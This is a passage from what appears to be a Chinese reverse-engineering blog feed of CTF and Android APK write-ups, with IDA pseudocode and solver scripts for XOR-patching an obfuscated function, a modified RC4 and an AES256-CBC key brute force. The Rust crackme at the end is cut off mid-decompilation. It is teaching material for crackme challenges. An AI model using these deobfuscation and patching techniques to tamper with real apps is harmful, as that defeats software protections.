0x0F,       0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,       0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,       0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F,       0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,       0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,       0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,       0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F,       0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F,       0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F,       0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF,       0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7, 0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF,       0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7, 0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF,       0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7, 0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF,       0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7, 0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF,       0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7, 0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF,       0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,       0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,       0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,       0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F,       0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,       0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,       0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,       0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F,       0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F,       0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F,       0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF,       0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7, 0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF,       0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7, 0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF]def patchFunc(addr,size,key):    for i in range(size):        # 从addr处读取1个字节的内容        byte = get_bytes(addr + i, 1)        # 异或运算解密        decodeBuf = ord(byte) ^ key[i]        print(&quot;i: %d, addr: %s, bytes_hex: %s, decode_bytes_hex: %s&quot; % (i,hex(addr + i),hex(ord(byte)),hex(decodeBuf)))        # 将addr地址处patch成decodeBuf的内容        patch_byte(addr + i, decodeBuf)patchFunc(0x8e00,464,key)</code></pre><p>ida直接运行脚本之后，发现ooxx函数的垃圾指令消失了。但是查看汇编会发现还是有不少指令没有正确识别</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250602141657187.png" alt="image-20250602141657187"></p><p>手动处理一下，在指令的最后方按一下E，申明一下函数结尾，就可以F5正常反编译了</p><pre><code class="language-c">bool __fastcall ooxx(int a1, int a2, int a3)&#123;  char *s2; // [sp+10h] [bp-20h]  bool v5; // [sp+17h] [bp-19h]  sub_8930();  v5 = 0;  s2 = (char *)sub_900C(a1, a3, 0);  if ( s2 )    v5 = strcmp(s1_, s2) == 0;  sub_8930();  return v5;&#125;</code></pre><p>逻辑就是将输入和<strong>kanxuetest</strong>(在前面异或解密得到的)进行比对。验证一下</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250602142448526.png" alt="image-20250602142448526"></p><p>最后附上附件<br>通过网盘分享的文件：记一次APK分析.zip<br>链接: <a href="https://pan.baidu.com/s/10xbShpIBcifkbQtI5KVoqg?pwd=81xp">https://pan.baidu.com/s/10xbShpIBcifkbQtI5KVoqg?pwd=81xp</a> 提取码: 81xp </p>]]></content>
      
      
      <categories>
          
          <category> Android-RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> WritesUp </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>抽象RC4</title>
      <link href="/2025/04/26/%E4%B8%80%E9%81%93%E5%BE%88%E9%80%86%E5%A4%A9%E7%9A%84RC4/"/>
      <url>/2025/04/26/%E4%B8%80%E9%81%93%E5%BE%88%E9%80%86%E5%A4%A9%E7%9A%84RC4/</url>
      
        <content type="html"><![CDATA[<h1 id="抽象RC4"><a href="#抽象RC4" class="headerlink" title="抽象RC4"></a>抽象RC4</h1><p>一道很逆天的题目…</p><p>ida直接分析</p><pre><code class="language-c">int __fastcall main(int argc, const char **argv, const char **envp)&#123;  unsigned int Seed; // eax  int v5[2]; // [rsp+2Ch] [rbp-14h] BYREF  unsigned int n0x2F; // [rsp+34h] [rbp-Ch]  int n3; // [rsp+38h] [rbp-8h]  int n15; // [rsp+3Ch] [rbp-4h]  _main(argc, argv, envp);  n15 = 15;  Seed = time(0i64);  srand(Seed);  puts(&quot;You want my treasure? You can have it all if you want it. Go find it! I hid the treasure chest in the program&quot;);  puts(&quot;Number of remaining steps: 15 | 1 to 3 steps per round | The first one to get to the KEY\n&quot;);  v5[1] = 0;  while ( n15 &gt; 0 )  &#123;    printf(&quot;Remaining steps: [%d]\n&quot;, (unsigned int)n15);    do    &#123;      printf(&quot;Number of steps (1-3): &quot;);      while ( scanf(&quot;%d&quot;, v5) != 1 )      &#123;        printf(&quot;Input error, please re-enter: &quot;);        while ( getchar() != 10 )          ;      &#125;      if ( v5[0] &gt; 0 &amp;&amp; v5[0] &lt;= 3 )      &#123;        if ( n15 &lt; v5[0] )          printf(aNotEnoughSteps, (unsigned int)n15);      &#125;      else      &#123;        puts(aMustTake13Step);      &#125;    &#125;    while ( v5[0] &lt;= 0 || v5[0] &gt; 3 || n15 &lt; v5[0] );    n15 -= v5[0];    printf(&quot;* Player walks %d steps, remaining %d\n\n&quot;, (unsigned int)v5[0], (unsigned int)n15);    if ( n15 &lt;= 0 )    &#123;      full_decrypt();      puts(&quot;This is your KEY. You deserve it ! !&quot;);      for ( n0x2F = 0; n0x2F &lt;= 0x2F; ++n0x2F )        printf(&quot;%02X&quot;, real_key[n0x2F]);      break;    &#125;    n3 = calculate_best_move((unsigned int)n15);    if ( n3 &lt;= 0 || n3 &gt; 3 )      n3 = 1;    if ( n3 &gt; n15 )      n3 = n15;    n15 -= n3;    printf(&quot;* The AI takes %d steps, remaining %d\n\n&quot;, (unsigned int)n3, (unsigned int)n15);    if ( n15 &lt;= 0 )      puts(&quot;This treasure does not belong to you. Go back, Boy&quot;);  &#125;  printf(&quot;\nGame over ! &quot;);  system(&quot;pause&quot;);  return 0;&#125;</code></pre><p>就是一个类似于之前TPCTF2025的一道题，”搬石头”，可以直接和”AI”对弈，第一步走”3”，然后后面走的每一步都是(4 - x)，x为上一回合中”AI”的步数，然后直接拿到key</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250426221230130.png" alt="image-20250426221230130"></p><p>一开始拿到key不知道有什么用，继续分析程序。在函数窗口看到有rc4_init，rc4_next</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250426221328189.png" alt="image-20250426221328189"></p><p>继续分析</p><p><strong>rc4_init</strong></p><pre><code class="language-c">__int64 __fastcall rc4_init(__int64 a1, __int64 a2, unsigned __int64 a3)&#123;  __int64 result; // rax  char v4; // [rsp+2h] [rbp-Eh]  int n255_1; // [rsp+4h] [rbp-Ch]  int v6; // [rsp+8h] [rbp-8h]  int n255; // [rsp+Ch] [rbp-4h]  for ( n255 = 0; n255 &lt;= 255; ++n255 )    *(_BYTE *)(a1 + n255) = n255;  v6 = 0;  for ( n255_1 = 0; n255_1 &lt;= 255; ++n255_1 )  &#123;    v6 = ((*(_BYTE *)(n255_1 % a3 + a2) ^ 0x37) + *(unsigned __int8 *)(a1 + n255_1) + v6) % 256;    v4 = *(_BYTE *)(a1 + n255_1);    *(_BYTE *)(a1 + n255_1) = *(_BYTE *)(a1 + v6);    *(_BYTE *)(a1 + v6) = v4;  &#125;  *(_DWORD *)(a1 + 260) = 0;  result = a1;  *(_DWORD *)(a1 + 256) = *(_DWORD *)(a1 + 260);  return result;&#125;</code></pre><p><strong>rc4_next</strong></p><pre><code class="language-c">__int64 __fastcall rc4_next(__int64 a1)&#123;  unsigned __int8 v2; // [rsp+Eh] [rbp-2h]  char v3; // [rsp+Fh] [rbp-1h]  *(_DWORD *)(a1 + 256) = (*(_DWORD *)(a1 + 256) + 1) % 256;  *(_DWORD *)(a1 + 260) = (*(_DWORD *)(a1 + 260) + *(unsigned __int8 *)(a1 + *(int *)(a1 + 256))) % 256;  v3 = *(_BYTE *)(a1 + *(int *)(a1 + 256));  *(_BYTE *)(a1 + *(int *)(a1 + 256)) = *(_BYTE *)(a1 + *(int *)(a1 + 260));  *(_BYTE *)(a1 + *(int *)(a1 + 260)) = v3;  v2 = *(_BYTE *)(a1 + (unsigned __int8)(*(_BYTE *)(a1 + *(int *)(a1 + 256)) + *(_BYTE *)(a1 + *(int *)(a1 + 260))));  return (16 * v2) | (unsigned int)(v2 &gt;&gt; 4);&#125;</code></pre><p>但是这两函数不被任何函数调用，但是我们在分析<strong>full_decrypt()<strong>函数时，在查看</strong>encrypted_key</strong>数组数据时看到一串可疑的数据</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250426221535815.png" alt="image-20250426221535815"></p><p>于是就尝试将这串数据作为密文，程序输出的key作为密钥按照程序中rc4的逻辑进行解密，这道题抽象的地方就在于，明明在main函数中看到输出key的格式化是十六进制形式，但是真正在解密的时候却是字符串，逆天…</p><p>由于程序的rc4进行了魔改，直接dump下伪代码进行解密</p><pre><code class="language-c">#include &lt;stdio.h&gt;#define _BYTE unsigned char#define _DWORD unsigned int#define _QWORD unsigned longunsigned char data[48] = &#123;    0xBB, 0xCA, 0x12, 0x14, 0xD0, 0xF1, 0x99, 0xA7, 0x91, 0x48, 0xC3, 0x28, 0x73, 0xAD, 0xB7, 0x75,    0x8C, 0x89, 0xCD, 0xDD, 0x2D, 0x50, 0x5D, 0x7F, 0x95, 0xB1, 0xA4, 0x9D, 0x09, 0x43, 0xE1, 0xD2,    0xE9, 0x66, 0xEA, 0x18, 0x98, 0xC6, 0xCC, 0x02, 0x39, 0x18&#125;;__int64 __fastcall rc4_init(__int64 a1, __int64 a2, unsigned __int64 a3)&#123;    __int64 result; // rax    char v4; // [rsp+2h] [rbp-Eh]    int j; // [rsp+4h] [rbp-Ch]    int v6; // [rsp+8h] [rbp-8h]    int i; // [rsp+Ch] [rbp-4h]    for (i = 0; i &lt;= 255; ++i)        *(_BYTE*)(a1 + i) = i;    v6 = 0;    for (j = 0; j &lt;= 255; ++j)    &#123;        v6 = ((*(_BYTE*)(j % a3 + a2) ^ 0x37) + *(unsigned __int8*)(a1 + j) + v6) % 256;        v4 = *(_BYTE*)(a1 + j);        *(_BYTE*)(a1 + j) = *(_BYTE*)(a1 + v6);                *(_BYTE*)(a1 + v6) = v4;        //printf(&quot;%d,&quot;,*(_BYTE*)(a1 + j));    &#125;    *(_DWORD*)(a1 + 260) = 0;    result = a1;    *(_DWORD*)(a1 + 256) = *(_DWORD*)(a1 + 260);    return result;&#125;__int64 __fastcall rc4_next(__int64 a1)&#123;    unsigned __int8 v2; // [rsp+Eh] [rbp-2h]    char v3; // [rsp+Fh] [rbp-1h]    *(_DWORD*)(a1 + 256) = (*(_DWORD*)(a1 + 256) + 1) % 256;    *(_DWORD*)(a1 + 260) = (*(_DWORD*)(a1 + 260) + *(unsigned __int8*)(a1 + *(int*)(a1 + 256))) % 256;    v3 = *(_BYTE*)(a1 + *(int*)(a1 + 256));    *(_BYTE*)(a1 + *(int*)(a1 + 256)) = *(_BYTE*)(a1 + *(int*)(a1 + 260));    *(_BYTE*)(a1 + *(int*)(a1 + 260)) = v3;    v2 = *(_BYTE*)(a1 + (unsigned __int8)(*(_BYTE*)(a1 + *(int*)(a1 + 256)) + *(_BYTE*)(a1 + *(int*)(a1 + 260))));    return (16 * v2) | (unsigned int)(v2 &gt;&gt; 4);&#125;unsigned char key[0x200];int main()&#123;    unsigned char real_key[] = &quot;EC3700DFCD4F364EC54B19C5E7E26DEF6A25087C4FCDF4F8507A40A9019E3B48BD70129D0141A5B8F089F280F4BE6CCD&quot;;    rc4_init((long long)key, (long long)real_key, sizeof(real_key)-1);    for (int i = 0; i &lt; 42; i++) &#123;        data[i] ^= rc4_next((long long)key);    &#125;    printf(&quot;%s&quot;, data);    return 0;&#125;</code></pre><p><strong>flag{8263b6c6-094d-4bd8-bbc2-b63ab34e8db7}</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> WritesUp </tag>
            
            <tag> 抽象 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>很有意思的一道题</title>
      <link href="/2025/04/24/%E5%BE%88%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/"/>
      <url>/2025/04/24/%E5%BE%88%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="很有意思的一道题"><a href="#很有意思的一道题" class="headerlink" title="很有意思的一道题"></a>很有意思的一道题</h1><p><strong>前言</strong>：</p><p>第一次看耐下性子看官方文档写题(太菜了)，记录一下。</p><p>ida打开直接分析，C++写的，一堆没见过的库，上网查了下，是wincrypt.h库函数的内容。</p><pre><code class="language-c++">int sub_443A60()&#123;  BYTE pbData__1[4]; // [esp+D0h] [ebp-D4h] BYREF  char n125; // [esp+D4h] [ebp-D0h]  char v3; // [esp+D5h] [ebp-CFh]  char v4; // [esp+D6h] [ebp-CEh]  char v5; // [esp+D7h] [ebp-CDh]  char v6; // [esp+D8h] [ebp-CCh]  char n57; // [esp+D9h] [ebp-CBh]  char v8; // [esp+DAh] [ebp-CAh]  char n48; // [esp+DBh] [ebp-C9h]  char v10; // [esp+DCh] [ebp-C8h]  char n33; // [esp+DDh] [ebp-C7h]  char n90; // [esp+DEh] [ebp-C6h]  char v13; // [esp+DFh] [ebp-C5h]  char n34; // [esp+E0h] [ebp-C4h]  char n46; // [esp+E1h] [ebp-C3h]  char n55; // [esp+E2h] [ebp-C2h]  char n69; // [esp+E3h] [ebp-C1h]  char n79; // [esp+E4h] [ebp-C0h]  char v19; // [esp+E5h] [ebp-BFh]  char n48_1; // [esp+E6h] [ebp-BEh]  char v21; // [esp+E7h] [ebp-BDh]  char v22; // [esp+E8h] [ebp-BCh]  char v23; // [esp+E9h] [ebp-BBh]  char v24; // [esp+EAh] [ebp-BAh]  char v25; // [esp+EBh] [ebp-B9h]  char n4; // [esp+ECh] [ebp-B8h]  char v27; // [esp+EDh] [ebp-B7h]  char v28; // [esp+EEh] [ebp-B6h]  char v29; // [esp+EFh] [ebp-B5h]  int pdwDataLen[3]; // [esp+F8h] [ebp-ACh] BYREF  BYTE pbData_[4]; // [esp+104h] [ebp-A0h] BYREF  int v32[10]; // [esp+110h] [ebp-94h] BYREF  BYTE pbData[12]; // [esp+138h] [ebp-6Ch] BYREF  char v34[40]; // [esp+144h] [ebp-60h] BYREF  int phKey[3]; // [esp+16Ch] [ebp-38h] BYREF  int phProv[3]; // [esp+178h] [ebp-2Ch] BYREF  char Src[5]; // [esp+184h] [ebp-20h] BYREF  char f_[15]; // [esp+189h] [ebp-1Bh] BYREF  int v39; // [esp+198h] [ebp-Ch] BYREF  __CheckForDebuggerJustMyCode(&amp;unk_4C70A3);  v39 = 0;  sub_4391EF(&amp;unk_4B6F60, &amp;v39);  Src[0] = 8;  Src[1] = 2;  Src[2] = 0;  Src[3] = 0;  Src[4] = 16;  strcpy(f_, &quot;f&quot;);  f_[2] = 0;  strcpy(&amp;f_[3], &quot; &quot;);  f_[5] = 0;  f_[6] = 0;  phProv[0] = 0;  phKey[0] = 0;  CryptAcquireContextA(phProv, 0, 0, 24u, 0);   // BOOL CryptAcquireContextA(                                                //   [out] HCRYPTPROV *phProv,                                                //   [in]  LPCSTR     szContainer,                                                //   [in]  LPCSTR     szProvider,                                                //   [in]  DWORD      dwProvType,                                                //   [in]  DWORD      dwFlags                                                // );  memset(v32, 0, 32);  j__memmove(pbData, Src, 0xCu);  sub_439F8C(v32, v39);  j__memmove(v34, v32, 0x20u);  CryptImportKey(phProv[0], pbData, 0x2Cu, 0, 0, phKey);// BOOL CryptImportKey(                                                //   [in]  HCRYPTPROV hProv,                                                //   [in]  const BYTE *pbData,                                                //   [in]  DWORD      dwDataLen,                                                //   [in]  HCRYPTKEY  hPubKey,                                                //   [in]  DWORD      dwFlags,                                                //   [out] HCRYPTKEY  *phKey                                                // );  *pbData_ = 2;  CryptSetKeyParam(phKey[0], 4u, pbData_, 0);   // BOOL CryptSetKeyParam(                                                //   [in] HCRYPTKEY  hKey,                                                //   [in] DWORD      dwParam,                                                //   [in] const BYTE *pbData,                                                //   [in] DWORD      dwFlags                                                // );  pdwDataLen[0] = 32;  qmemcpy(pbData__1, &quot;l]4&quot;, 3);  pbData__1[3] = -33;  n125 = 125;  v3 = -52;  v4 = -1;  v5 = -32;  v6 = -21;  n57 = 57;  v8 = -101;  n48 = 48;  v10 = 0x80;  n33 = 33;  n90 = 90;  v13 = -71;  n34 = 34;  n46 = 46;  n55 = 55;  n69 = 69;  n79 = 79;  v19 = -67;  n48_1 = 48;  v21 = -5;  v22 = -37;  v23 = -58;  v24 = -85;  v25 = -28;  n4 = 4;  v27 = -74;  v28 = -18;  v29 = -59;  CryptDecrypt(phKey[0], 0, 1, 0, pbData__1, pdwDataLen);// NTSTATUS BCryptDecrypt(                                                //   [in, out]           BCRYPT_KEY_HANDLE hKey,                                                //   [in]                PUCHAR            pbInput,                                                //   [in]                ULONG             cbInput,                                                //   [in, optional]      VOID              *pPaddingInfo,                                                //   [in, out, optional] PUCHAR            pbIV,                                                //   [in]                ULONG             cbIV,                                                //   [out, optional]     PUCHAR            pbOutput,                                                //   [in]                ULONG             cbOutput,                                                //   [out]               ULONG             *pcbResult,                                                //   [in]                ULONG             dwFlags                                                // );  if ( *pbData__1 == 1734437990 )    return sub_439C49(&quot;you got it %s\n&quot;, pbData__1);  else    return sub_439C49(&quot;wrong&quot;);&#125;</code></pre><p>于是上网查微软的官方文档</p><p>首先看到语法，ida里的值和结构体中的值进行比对，然后重点看有关<strong>dwProvType</strong>的内容</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250424200204193.png" alt="image-20250424200204193"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250424200404406.png" alt="image-20250424200404406"></p><p>双击进去查看</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250424200428616.png" alt="image-20250424200428616"></p><p>可以看到有不少预定义的提供程序类型</p><p>然后我们开始去<strong>wincrypt.h</strong>里面找</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250424200623751.png" alt="image-20250424200623751"></p><p>看到只有RSA_AES对应的值是24(0x18)，那么我们就可以初步判断这是AES-RSA加密</p><p>然后继续看<strong>CryptImportKey</strong><br>根据<strong>phData</strong>的值可得知AES的密钥长度是32(dataLen &#x3D; 0x2C &#x3D; 44 &#x3D;32 + 12)。</p><p>然后再看<strong>CryptSetKeyParam</strong>，注意看<strong>dwParam</strong>的有关内容，然后也还是和上面的方法一样，去.h文件里搜所提及到的</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250424204322464.png" alt="image-20250424204322464"></p><p>这里可以看到dwParam的值指定的是加密的模式，然后在官方文档中可以看到</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250424204332540.png" alt="image-20250424204332540"></p><p>也就是我们所熟知的几种模式，继续在.h文件里查，ida中可知pbData_&#x3D;2</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250424204624018.png" alt="image-20250424204624018"></p><p>到此，可以确定是AES_CBC了</p><p>但是AES还分192，128和256，以下是确定办法</p><p>找到<strong>CryptImportKey</strong>函数的文档内容，看到结构体中的第二个参数</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250424212524839.png" alt="image-20250424212524839"></p><p>查看<strong>PUBLICKEYSTRUCT</strong></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250424213004131.png" alt="image-20250424213004131"></p><p>看到最后一个参数</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250424213021152.png" alt="image-20250424213021152"></p><p>双击查看<strong>AIG_ID</strong></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250424213129572.png" alt="image-20250424213129572"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250424213214596.png" alt="image-20250424213214596"></p><p>这样就确定了是AES256-CBC</p><p>接下来就是key了，查看<strong>sub_439F8C</strong>函数</p><pre><code class="language-c">int __cdecl sub_443780(int a1, int Src)&#123;  int result; // eax  int n15; // [esp+D0h] [ebp-8h]  result = __CheckForDebuggerJustMyCode(&amp;unk_4C70A3);  for ( n15 = 15; n15 &gt;= 0; --n15 )  &#123;    j__memmove((a1 + 2 * n15), &amp;Src, 2u);    Src ^= (Src &lt;&lt; 7) ^ (Src &lt;&lt; 11) ^ (Src &gt;&gt; 5);    result = n15 - 1;  &#125;  return result;&#125;</code></pre><p>但是真实的不是右移5位，具体怎么确认的，就是附加进程调试，然后观察运行结果，同时自己写一个一样的，以二进制的形式去比对哪一位有出入，因为是相互异或，所以好确认是哪一位出问题了，找到问题，反推出是在哪里位移的时候出问题了</p><p>最后附上解密脚本</p><pre><code class="language-python">from Crypto.Cipher import AESimport binasciidef keygen(src):    key = bytearray(32)    for i in range(15, -1, -1):        key[2 * i:2 * i + 2] = (src &amp; 0xFFFF).to_bytes(2, byteorder=&#39;little&#39;)        src ^= ((src &amp; 0xFFFF) &lt;&lt; 7) ^ ((src &amp; 0xFFFF) &lt;&lt; 11) ^ ((src &amp; 0xFFFF) &gt;&gt; 4)    return keyciphertext_hex = &quot;6c5d34df7dccffe0eb399b3080215ab9222e37454fbd30fbdbc6abe404b6eec5&quot;ciphertext = binascii.unhexlify(ciphertext_hex)target_prefix = b&quot;666c6167&quot;for src in range(0x0, 0xFFFFFFFF + 1):    key = keygen(src)    cipher = AES.new(key, AES.MODE_ECB)    try:        decrypted = cipher.decrypt(ciphertext)        if decrypted.hex().startswith(target_prefix.decode()):            print(f&quot;Found SRC: &#123;src:#010x&#125;&quot;)            print(f&quot;Decrypted plaintext: &#123;decrypted.hex()&#125;&quot;)            break    except Exception as e:        continue</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250424215544201.png" alt="image-20250424215544201"></p><p><strong>flag{father_Debug_child_is_fUN!}</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> WritesUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>京麒CTF2025热身赛</title>
      <link href="/2025/04/23/%E4%BA%AC%E9%BA%92CTF2025%20%E7%83%AD%E8%BA%AB%E8%B5%9B/"/>
      <url>/2025/04/23/%E4%BA%AC%E9%BA%92CTF2025%20%E7%83%AD%E8%BA%AB%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="京麒CTF2025热身赛"><a href="#京麒CTF2025热身赛" class="headerlink" title="京麒CTF2025热身赛"></a>京麒CTF2025热身赛</h1><h3 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h3><p>rust逆向，符号表也被删了，但是没管那么多，直接动调跟，看看加密逻辑在哪</p><pre><code class="language-c">__int64 sub_7FF7F63A1100()&#123;  unsigned __int64 flag_len; // rdx  size_t n0x41_2; // r15  void *Src_1; // r12  char *Src_4; // rdx  size_t Size; // rbx  char *v5; // r9  char *Src_2; // r8  char v7; // r11  char *Src_3; // rsi  char *v9; // rax  char n0xF0; // r8  unsigned int n0x80; // r11d  int v12; // r9d  int v13; // edi  int v14; // r11d  unsigned int n48; // esi  __int64 flag2; // r14  char v17; // bl  char *Src_6; // r11  unsigned int n32; // esi  char v20; // di  char v21; // bl  int v22; // ebx  int v23; // edi  unsigned int n22; // edi  char *Src_5; // rdx  char *Src_8; // rdi  __int64 v27; // rsi  __int64 Src_10; // rax  unsigned __int16 v29; // di  __int64 Buf1_1; // rax  _BYTE *Buf1; // rsi  __int64 i; // rax  unsigned int v33; // et0  unsigned __int8 v34; // cl  unsigned __int8 v35; // cl  _OWORD flag[4]; // [rsp+30h] [rbp-50h] BYREF  __int64 v38; // [rsp+78h] [rbp-8h] BYREF  char **_err_n_; // [rsp+80h] [rbp+0h] BYREF  void *Src; // [rsp+88h] [rbp+8h]  __int64 n8; // [rsp+90h] [rbp+10h]  __int128 v42; // [rsp+98h] [rbp+18h]  __int64 Src_7; // [rsp+B0h] [rbp+30h]  size_t Size_1; // [rsp+B8h] [rbp+38h]  int v45; // [rsp+C4h] [rbp+44h]  __int64 v46; // [rsp+C8h] [rbp+48h]  v46 = -2;  memset(flag, 0, sizeof(flag));  v38 = sub_7FF7F63A4DF0();  if ( (sub_7FF7F63A4E20(&amp;v38, flag, 64) &amp; 1) != 0 )// scanf  &#123;    _err_n_ = flag_len;    sub_7FF7F63BB420(aCalledResultUn, 43, &amp;_err_n_, &amp;off_7FF7F63BC3A0, &amp;off_7FF7F63BC428);// &quot;src/main.rs&quot;  &#125;  if ( flag_len &gt;= 65 )                         // 长度是64？    sub_7FF7F63BB520(flag_len, 64, &amp;off_7FF7F63BC440);// &quot;src/main.rs&quot;  sub_7FF7F63B47D0(&amp;_err_n_, flag, flag_len);  n0x41_2 = _err_n_;  Src_1 = Src;  Src_4 = Src + n8;  if ( n8 )  &#123;    Size = 0;    v5 = 0;    Src_2 = Src;    do    &#123;      Src_3 = Src_2;      v9 = v5;      n0xF0 = *Src_2;      n0x80 = n0xF0;      if ( n0xF0 &lt; 0 )      &#123;        v12 = n0xF0 &amp; 0x1F;        v13 = Src_3[1] &amp; 0x3F;        if ( n0xF0 &lt;= 0xDFu )        &#123;          Src_2 = Src_3 + 2;          n0x80 = v13 | (v12 &lt;&lt; 6);        &#125;        else        &#123;          v14 = (v13 &lt;&lt; 6) | Src_3[2] &amp; 0x3F;          if ( n0xF0 &lt; 0xF0u )          &#123;            Src_2 = Src_3 + 3;            n0x80 = (v12 &lt;&lt; 12) | v14;          &#125;          else          &#123;            Src_2 = Src_3 + 4;            n0x80 = ((v12 &amp; 7) &lt;&lt; 18) | (v14 &lt;&lt; 6) | Src_3[3] &amp; 0x3F;          